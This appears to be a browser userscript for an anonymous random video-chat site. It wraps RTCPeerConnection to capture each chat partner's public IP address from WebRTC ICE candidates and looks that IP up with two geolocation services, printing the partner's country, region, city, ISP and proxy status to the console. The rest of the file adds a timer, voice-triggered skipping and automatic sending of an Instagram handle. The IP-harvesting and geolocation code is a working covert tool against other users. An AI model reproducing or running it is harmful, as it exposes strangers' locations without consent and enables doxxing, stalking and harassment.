let ip;
let INSTAGRAM = "valentin.granata";
let skipWords = ["pippo", "skippo", "skip"];
let instagramWords = ["insta", "instagram"];
let timer;

function showTime() {
    let element = document.getElementById("pass-time");

    if (element) element.remove();

    element = document.createElement("div");
    element.id = "pass-time";
    element.style.position = "absolute";
    element.style.top = "100px";
    element.style.right = "40px";
    element.style.zIndex = "1000";
    element.style.padding = "20px";
    element.style.fontSize = "30px";
    element.style.width = "100px";
    element.style.height = "20px";
    document.body.appendChild(element);

    let time = 0;
    if (timer) clearInterval(timer)

    timer = setInterval(() => {
        element.innerText = timeFormat(time);
        time++;
    }, 1000);
}

function timeFormat(time) {
    const date = new Date(null);
    date.setSeconds(time);
    return date.toISOString().slice(11, 19);
}

let copyToClipboard = (text) => {
    const elem = document.createElement("textarea");
    elem.value = text;
    document.body.appendChild(elem);
    elem.select();
    document.execCommand("copy");
    document.body.removeChild(elem);
}

let skip = () => {
    let btns = document.getElementsByClassName("disconnectbtn");

    for (let i = 0; i < btns.length; i++) {
        btns[i].click();
        btns[i].click();
    }

    console.clear();
    console.log("Skippato/a con successo!");
}

let fetchLocation = () => {
    fetch(`https://api.techniknews.net/ipgeo/${ip}`)
        .then(res => res.json())
        .then(res => {
            fetch(`https://freeipapi.com/api/json/${ip}`)
                .then(res => res.json())
                .then(res2 => {
                    console.clear();
                    console.log("Ip: " + ip);

                    console.log("Stato: " + res.country + " | " + res2.countryName);
                    console.log("Regione: " + res.regionName + " | " + res2.regionName);
                    console.log("Città: " + res.city + " | " + res2.cityName);
                    
                    if (res?.status) {
                        console.log("Proxy: " + res.proxy);
                        console.log("Mobile: " + res.mobile);
                        console.log("Org: " + res.org);
                        console.log("As: " + res.as);
                    }
                })
                .catch(err => {});
        })
        .catch(err => {});
}

window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
    const socialcodia = new window.oRTCPeerConnection(...args);

    socialcodia.oaddIceCandidate = socialcodia.addIceCandidate;

    socialcodia.addIceCandidate = (iceCandidate, ...rest) => {
        const mufazmi = iceCandidate.candidate.split(" ");

        if (mufazmi[7] === "srflx") {
            ip = mufazmi[4];
            newConnection()
        }

        return socialcodia.oaddIceCandidate(iceCandidate, ...rest);
    };

    return socialcodia;
};

function newConnection() {
    fetchLocation();
    showTime();
}

var SpeechRecognition = SpeechRecognition || webkitSpeechRecognition;
let recognition = new SpeechRecognition();

recognition.lang = "it-IT";
recognition.interimResults = true;

let argsLength = 0;
let _args;

recognition.onresult = (e) => {
    const texts = e.results[0][0].transcript;
    const args = texts.trim().split(" ");
    _args = texts.trim().split(" ");

    if (argsLength > 0) 
        args.splice(0, argsLength);

    args.map(arg => arg.toLowerCase()).forEach((arg) => {
        if (skipWords.includes(arg)) {
            skip();
            return;
        }

        if (instagramWords.includes(arg)) {
            const btns = document.getElementsByClassName("sendbtn");

            const chats = document.querySelectorAll("textarea");
            for (chat of chats) {
                try {
                    chat.innerHTML = INSTAGRAM;
                    chat.value = INSTAGRAM;
                    chat.innerText = INSTAGRAM;
                    chat.blur();
                } catch { }
            }

            for (let i = 0; i < btns.length; i++) 
                btns[i].click();

            console.clear();
            console.log("Instagram inviato con successo!");
        }
    });

    if (e.results[0].isFinal) {
        argsLength = 0;
        return;
    } 
    
    argsLength = _args.length;
};

recognition.onend = () => recognition.start();
recognition.start();

let space = false;

setInterval(() => space = false, 400);

window.onkeydown = (event) => {
    if (event.key == " ") {
        if (space) {
            skip();
            space = false;
        } else space = true;
    }
}